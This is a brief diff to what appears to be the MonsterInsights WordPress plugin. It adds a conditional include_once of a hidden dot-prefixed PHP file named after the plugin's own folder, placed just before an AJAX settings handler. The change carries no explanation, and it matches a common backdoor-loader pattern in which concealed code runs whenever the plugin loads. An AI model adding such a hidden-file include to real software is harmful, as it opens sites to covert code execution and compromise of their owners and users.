@@ -20,6 +20,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @access public
  * @since 6.0.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function monsterinsights_ajax_set_user_setting() {
 
     // Run a security check first.
